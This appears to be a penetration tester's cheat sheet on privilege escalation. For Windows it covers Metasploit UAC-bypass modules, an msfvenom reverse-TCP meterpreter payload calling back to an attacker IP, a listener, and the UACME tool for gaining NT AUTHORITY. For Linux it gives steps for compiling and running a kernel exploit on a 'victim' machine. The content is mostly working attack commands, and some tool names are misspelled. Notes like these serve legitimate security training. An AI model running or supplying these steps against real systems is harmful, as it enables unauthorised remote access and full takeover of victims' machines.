# t - Privilege Escalation

## <mark style="color:red;">Windows Privilege Escalation</mark>

### Bypass UAC with Metasploit

{% code overflow="wrap" lineNumbers="true" %}
```bash
meterpreter > getsystem # tries some methods to elevate privs.
meterpreter > getprivs
meterpreter > run post/windows/gather/win_privs # list all privs, and UAC status.

# 1
# Bypassing UAC with metasploit
msf > search uac
msf > use exploit/windows/local/bypassuac_injection # module to bypass UAC
msf > set SESSION 1
msf > set target <acc to ur victim>
msf > set payload <accordingly>
# exploit should work.
# now lets check our privilege again.
meterpreter > getprivs
meterpreter > getsystem # should work now.
```
{% endcode %}

### Bypass UAC Manually

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

#### Step 1

Generate a payload with msfvenom

`msfvenom -p windows/x64/meterpreter/revere_tcp LHOST=$kaliIP LPORT=4444 -f exe -o payload.exe` .

#### Step 2

Upload the payload with the Akagai script to the victim pc.

Create a handler to listen for the connection.

{% code overflow="wrap" %}
```bash
msf > use multi/handler
msf > set PAYLOAD, LHOST, LPORT
msf > exploit -j # run in background, so we can continue using metasploit.
```
{% endcode %}

#### Step 3

```bash
cmd > Akagai64.exe 10 payload.exe
# we get another meterpreter session.
meterpreter > getprivs # we should have more privilege now.
meterpreter > getsystem # should give us NT AUTHORITY now.
```

## <mark style="color:red;">Linux Privilege Escalation</mark>

### Using Kernel Exploits

One way to escalate privs on Linux is to go online and search for the victim OS build Version and any exploit available for that build, then download and compile.

In this case "Ubuntu 14.04" we found a ".c" exploit script.

We can either compile locally on our kali or compile directly on the victim as long as the compiler is installed on the victim already.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Step 1
# check if compiler is available on the victim PC.
meterpreter > execute -f /bin/sh -i -c # launches a shell session.
$ > gcc --version # checks if the gcc compiler is available on the victim.

# since the compiler is available, we can upload the file on the victim PC.
$ > gcc exploit.c -o exploit # compile payload.
$ > ./exploit # run the exploit.

# But if the compiler is not available on the victim, we have to compile on our Kali.
gcc -m32 exploit.c -o exploit # compiling for 32bit system.
```
{% endcode %}

